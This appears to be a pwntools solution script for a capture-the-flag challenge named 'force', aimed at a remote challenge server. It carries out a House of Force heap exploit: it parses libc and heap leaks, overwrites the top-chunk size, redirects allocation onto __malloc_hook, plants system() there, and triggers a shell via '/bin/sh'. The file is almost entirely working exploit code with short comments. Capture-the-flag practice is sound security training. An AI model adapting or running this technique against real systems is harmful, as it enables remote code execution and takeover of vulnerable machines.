from pwn import *
import time
elf = context.binary = ELF("force/force")
libc = ELF(elf.runpath + b"/libc.so.6")

# Allowing gdb hook
gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        # return process(elf.path)
        return remote('0.cloud.chals.io', 11996)


def use_the_force(size, data):
    time.sleep(0.5)
    p.sendline(b'1')
    time.sleep(0.5)
    #print(p.recvuntil(b'?: ').decode())
    p.sendline(f'{size}')
    time.sleep(0.5)
    #print(p.recvuntil(b'?: ').decode())
    p.sendline(data)

# Calculate the "wraparound" distance between two addresses.


def delta(x, y):
    return (0xffffffffffffffff - x) + y


# Start our process
p = start()
p.timeout = 0.1
# Receive libc leak
print(p.recvuntil(b'system at ').decode())
libc_system = int(p.recvline(), 16)
libc.address = libc_system - libc.sym.system

# Receive heap leak
print(p.recvuntil(b'else at ').decode())
heap = int(p.recvline(), 16)
print(f'system() at {hex(libc_system)} and heap at {hex(heap)}')
# print(p.recv().decode())

# Overwrite size field of top_chunk; heap will now be at heap+0x30
use_the_force(24, b'a'*24 + p64(0xffffffffffffffff))

# Write '/bin/sh\0' onto the heap and then iterate our top_chunk pointer to the __malloc_hook symbol
distance = (libc.sym.__malloc_hook - 0x20) - (heap + 0x20)
use_the_force(distance, b'/bin/sh\0')

# write in address of system() at the __malloc_hook
use_the_force(24, p64(libc_system))

# Now when we call malloc(arg1), it will treat is as a system(arg1) call
# We specify the input argument as the address of where we wrote '/bin/sh\0'
cmd = heap + 0x30
use_the_force(cmd, '')

# Interactive mode
p.interactive()
